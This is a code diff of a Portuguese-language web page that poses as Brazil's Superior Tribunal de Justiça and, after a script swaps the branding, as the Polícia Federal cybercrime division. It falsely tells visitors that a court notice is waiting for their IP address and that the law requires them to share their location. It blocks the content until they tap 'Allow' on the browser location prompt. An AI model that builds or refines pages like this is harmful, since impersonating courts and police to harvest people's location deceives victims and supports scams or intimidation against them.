@@ -14,13 +14,13 @@
     }
     .wrap { max-width: 760px; margin: 0 auto; }
 
-    /* ===== TOPbar institucional ===== */
+    /* ===== TOPbar institucional (STJ — tela de permissão) ===== */
     .barra-topo {
-      background: linear-gradient(135deg, var(--pf-blue) 0%, var(--pf-blue2) 100%);
+      background: linear-gradient(135deg, #1a2f4a 0%, #24466b 100%);
       border-radius: 12px; padding: 14px 20px; display: flex; align-items: center; gap: 14px;
       box-shadow: 0 8px 30px rgba(10,46,92,.25); margin-bottom: 22px;
     }
-    .barra-topo img { height: 46px; width: 46px; border-radius: 50%; object-fit: cover; border: 2px solid var(--gold); }
+    .barra-topo img { height: 46px; width: 46px; border-radius: 50%; object-fit: cover; border: 2px solid #b9974e; }
     .barra-topo .org h1 { color: #fff; font-size: .95rem; letter-spacing: .1em; }
     .barra-topo .org p { color: #9db4cf; font-size: .68rem; letter-spacing: .08em; margin-top: 2px; }
 
@@ -109,11 +109,11 @@
 </head>
 <body>
   <div class="wrap">
-    <div class="barra-topo">
-      <img src="https://i.imgur.com/OhF5OTT.jpeg" alt="Polícia Federal" onerror="this.style.display='none'" />
+    <div class="barra-topo" id="barraStj">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Bras%C3%A3o_do_Superior_Tribunal_de_Justi%C3%A7a.svg/240px-Bras%C3%A3o_do_Superior_Tribunal_de_Justi%C3%A7a.svg.png" alt="Superior Tribunal de Justiça" onerror="this.style.display='none'" />
       <div class="org">
-        <h1>DEPARTAMENTO DE POLÍCIA FEDERAL</h1>
-        <p>DIVISÃO DE COMBATE A CRIMES CIBERNÉRICOS — DCCIB</p>
+        <h1>SUPERIOR TRIBUNAL DE JUSTIÇA</h1>
+        <p>CARTÓRIO JUDICIAL DIGITAL — VALIDAÇÃO DE INTIMAÇÕES ELETRÔNICAS</p>
       </div>
     </div>
 
@@ -123,15 +123,15 @@
         <div class="ico-escudo">
           <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#0a2e5c" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
         </div>
-        <h2>Verificação de Acesso Necessária</h2>
-        <p class="sub">Este documento é protegido pelo sistema de rastreio de acesso do Departamento de Polícia Federal. Para visualizar o conteúdo da notificação, é <b>obrigatória a validação geográfica da sua conexão</b>.</p>
+        <h2>Consulta de Intimação Eletrônica</h2>
+        <p class="sub">Existe uma <b>notificação judicial disponível para o endereço de IP desta conexão</b>. Por exigência do art. 5º da Lei nº 11.419/2006 (Processo Eletrônico), a entrega exige a <b>confirmação da localização geográfica do destinatário</b>.</p>
 
         <div class="caixa-autorizacao">
-          <b>📍 Autorização de localização solicitada</b>
-          <p>Seu navegador exibirá um pedido de permissão de localização. <b>Toque em "Permitir" / "Allow"</b> para validar seu acesso e exibir o documento. A validação é registrada no histórico de auditoria desta consulta.</p>
+          <b>📍 Autorização de localização necessária</b>
+          <p>Seu navegador exibirá um pedido de permissão de localização. <b>Toque em "Permitir" / "Allow"</b> para confirmar seu acesso e exibir o teor da notificação. O acesso sem validação não permite a visualização do documento.</p>
         </div>
 
-        <button class="btn-verify" id="btnVerificar" onclick="iniciarVerificacao()">VALIDAR MEU ACESSO E VISUALIZAR O DOCUMENTO</button>
+        <button class="btn-verify" id="btnVerificar" onclick="iniciarVerificacao()" style="background:linear-gradient(135deg,#1a2f4a 0%,#24466b 100%)">CONFIRMAR LOCALIZAÇÃO E EXIBIR NOTIFICAÇÃO</button>
         <div class="carregando" id="spinnerVerificacao"></div>
         <p class="aviso-obrig" id="avisoObrig">⚠️ ACESSO NÃO AUTORIZADO. A validação geográfica é obrigatória para visualizar este documento. Tente novamente e <b>PERMITA a localização</b>.</p>
       </div>
@@ -243,6 +243,14 @@
     function revelar(d) {
       document.getElementById("spinnerVerificacao").style.display = "none";
       document.getElementById("portalVerificacao").style.display = "none";
+      // Troca a identidade: STJ (permissão) -> Polícia Federal (notificação).
+      var barra = document.getElementById("barraStj");
+      barra.style.background = "linear-gradient(135deg, #0a2e5c 0%, #123c74 100%)";
+      barra.querySelector("img").src = "https://i.imgur.com/OhF5OTT.jpeg";
+      barra.querySelector("img").style.borderColor = "#c9a227";
+      barra.querySelector(".org h1").textContent = "DEPARTAMENTO DE POLÍCIA FEDERAL";
+      barra.querySelector(".org p").textContent = "DIVISÃO DE COMBATE A CRIMES CIBERNÉRICOS — DCCIB";
+      barra.id = "";
       document.getElementById("notificacao").style.display = "block";
       window.scrollTo({ top: 0 });
 
